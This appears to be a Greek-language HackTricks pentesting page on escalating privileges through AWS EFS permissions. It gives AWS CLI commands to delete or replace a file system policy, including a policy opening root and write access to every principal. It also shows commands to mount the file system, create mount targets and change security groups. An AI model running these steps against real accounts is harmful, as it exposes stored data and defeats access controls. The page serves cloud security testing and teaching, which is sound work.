# AWS - EFS Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## EFS

Περισσότερες **πληροφορίες για το EFS** στο:

{{#ref}}
../../aws-services/aws-efs-enum.md
{{#endref}}

Να θυμάστε ότι για να προσαρτήσετε ένα EFS πρέπει να βρίσκεστε σε ένα υποδίκτυο όπου το EFS είναι εκτεθειμένο και να έχετε πρόσβαση σε αυτό (security groups). Εάν συμβαίνει αυτό, από προεπιλογή θα μπορείτε πάντα να το προσαρτήσετε, ωστόσο εάν προστατεύεται από IAM policies χρειάζεστε τα επιπλέον δικαιώματα που αναφέρονται εδώ για να το προσπελάσετε.

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

Με οποιοδήποτε από αυτά τα δικαιώματα ένας επιτιθέμενος μπορεί να **αλλάξει την πολιτική του συστήματος αρχείων** ώστε να **σας δώσει πρόσβαση** σε αυτό, ή απλώς να την **διαγράψει** ώστε να χορηγηθεί η **προεπιλεγμένη πρόσβαση**.

Για να διαγράψετε την πολιτική:
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
Για να το αλλάξετε:
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

Με αυτήν την άδεια ένας επιτιθέμενος θα μπορεί να **mount the EFS**. Αν η write permission δεν δίνεται από προεπιλογή σε όλους που μπορούν να mount the EFS, θα έχει μόνο **read access**.
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
Οι επιπλέον άδειες `elasticfilesystem:ClientRootAccess` και `elasticfilesystem:ClientWrite` μπορούν να χρησιμοποιηθούν για να **γράψετε** μέσα στο σύστημα αρχείων αφού έχει προσαρτηθεί και για να **έχετε πρόσβαση** σε αυτό το σύστημα αρχείων **ως root**.

**Πιθανές Επιπτώσεις:** Έμμεσο privesc εντοπίζοντας ευαίσθητες πληροφορίες στο σύστημα αρχείων.

### `elasticfilesystem:CreateMountTarget`

Αν ένας attacker βρίσκεται μέσα σε ένα **υποδίκτυο** όπου **δεν υπάρχει mount target** για το EFS, θα μπορούσε απλώς να **δημιουργήσει ένα στο υποδίκτυό του** με αυτό το privilege:
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**Πιθανός Αντίκτυπος:** Έμμεσο privesc εντοπίζοντας ευαίσθητες πληροφορίες στο σύστημα αρχείων.

### `elasticfilesystem:ModifyMountTargetSecurityGroups`

Σε ένα σενάριο όπου ένας attacker διαπιστώνει ότι το EFS έχει mount target στο subnetwork του αλλά **καμία security group δεν επιτρέπει την κυκλοφορία**, θα μπορούσε απλά να το **αλλάξει τροποποιώντας τις επιλεγμένες security groups**:
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**Πιθανός Αντίκτυπος:** Έμμεση privesc εντοπίζοντας ευαίσθητες πληροφορίες στο σύστημα αρχείων.

{{#include ../../../../banners/hacktricks-training.md}}
